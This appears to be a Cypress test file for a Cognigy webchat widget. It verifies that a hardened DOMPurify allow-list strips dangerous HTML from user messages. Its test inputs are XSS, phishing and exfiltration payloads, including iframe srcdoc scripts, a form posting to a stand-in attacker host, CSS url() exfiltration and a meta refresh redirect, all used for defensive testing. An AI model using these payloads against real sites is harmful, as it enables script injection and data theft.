// eslint-disable-next-line @typescript-eslint/triple-slash-reference
/// <reference path="../support/index.d.ts" />

// Tests for WCH-SI10-001: DOMPurify allow-list hardening.
// sanitizeHTML() is exercised via the user-message send path
// (message-middleware SEND_MESSAGE → sanitizeHTML → Redux → chat history).
// disableHtmlInput is set to false so that HTML reaches sanitizeHTML
// rather than being stripped by stripHtmlToInertText first.

describe("sanitize — DOMPurify allow-list hardening (WCH-SI10-001)", () => {
	const init = () =>
		cy
			.visitWebchat()
			.initMockWebchat({
				settings: {
					widgetSettings: {
						disableHtmlInput: false,
					},
				},
			})
			.openWebchat()
			.startConversation();

	const typeAndSend = (value: string) => {
		cy.get(".webchat-input-message-label")
			.contains("label", "Type something here…")
			.invoke("attr", "for")
			.then(inputId => {
				cy.get(`#${inputId}`).type(value, { parseSpecialCharSequences: false });
			});
		cy.get('[aria-label="Send message"]').click();
	};

	describe("removed dangerous tags are stripped from user input", () => {
		beforeEach(() => {
			init();
		});

		it("strips <iframe> — was in allow-list, enables srcdoc XSS", () => {
			typeAndSend('<iframe srcdoc="<script>alert(1)</script>">content</iframe>');
			cy.get("[data-cognigy-webchat-root]").find("iframe").should("not.exist");
		});

		it("strips <base> — was in allow-list, rewrites all relative URLs on host page", () => {
			typeAndSend('<base href="https://attacker.example.com">');
			cy.get("[data-cognigy-webchat-root]").find("base").should("not.exist");
		});

		it("strips <form> — was in allow-list, posts user data to attacker domain", () => {
			typeAndSend('<form action="https://attacker.example.com"><input name="q"></form>');
			cy.get("[data-cognigy-webchat-root]").find("form").should("not.exist");
		});

		it("strips <object> — was in allow-list, loads arbitrary external content", () => {
			typeAndSend('<object data="https://attacker.example.com/payload.swf"></object>');
			cy.get("[data-cognigy-webchat-root]").find("object").should("not.exist");
		});

		it("strips <embed> — was in allow-list, loads arbitrary external content", () => {
			typeAndSend('<embed src="https://attacker.example.com/payload.swf">');
			cy.get("[data-cognigy-webchat-root]").find("embed").should("not.exist");
		});

		it("strips <style> — was in allow-list, enables CSS injection and attribute exfiltration", () => {
			typeAndSend("<style>body{background:url(https://attacker.example.com)}</style>");
			cy.get("[data-cognigy-webchat-root]").find("style").should("not.exist");
		});

		it("strips <meta> — was in allow-list, enables HTTP redirect and CSP bypass", () => {
			typeAndSend('<meta http-equiv="refresh" content="0;url=https://attacker.example.com">');
			cy.get("[data-cognigy-webchat-root]").find("meta").should("not.exist");
		});

		it("strips <link> — was in allow-list, loads external stylesheets", () => {
			typeAndSend('<link rel="stylesheet" href="https://attacker.example.com/evil.css">');
			cy.get("[data-cognigy-webchat-root]").find("link").should("not.exist");
		});
	});

	describe("removed dangerous attributes are stripped from user input", () => {
		beforeEach(() => {
			init();
		});

		it("strips formaction attribute — enables form phishing even without <form action>", () => {
			typeAndSend('<button formaction="https://attacker.example.com">Click</button>');
			cy.get("[data-cognigy-webchat-root]").find("[formaction]").should("not.exist");
		});

		it("strips srcdoc attribute — inline HTML document in iframe is a direct XSS vector", () => {
			typeAndSend('<iframe srcdoc="<script>alert(1)</script>">fallback</iframe>');
			cy.get("[data-cognigy-webchat-root]").find("[srcdoc]").should("not.exist");
		});

		it("strips style attribute — inline CSS enables exfiltration and UI redressing", () => {
			typeAndSend('<span style="background:url(https://attacker.example.com)">text</span>');
			cy.get("[data-cognigy-webchat-root]").find("[style]").should("not.exist");
		});
	});

	describe("safe tags are preserved (regression guard)", () => {
		beforeEach(() => {
			init();
		});

		it("preserves text content of messages after sanitization", () => {
			typeAndSend("hello world");
			cy.get(".webchat-chat-history").contains("hello world");
		});

		it("preserves href on anchor tags", () => {
			typeAndSend('<a href="https://cognigy.com">Cognigy</a>');
			cy.get(".webchat-chat-history").contains("Cognigy");
		});
	});

	describe("Accessibility (WCAG 2.2 AA)", () => {
		it("chat surface has no a11y violations after sending sanitized content", () => {
			init();
			typeAndSend('<iframe src="https://evil.example.com">content</iframe>normal text');
			cy.checkA11yCompliance("[data-cognigy-webchat-root]");
		});
	});
});
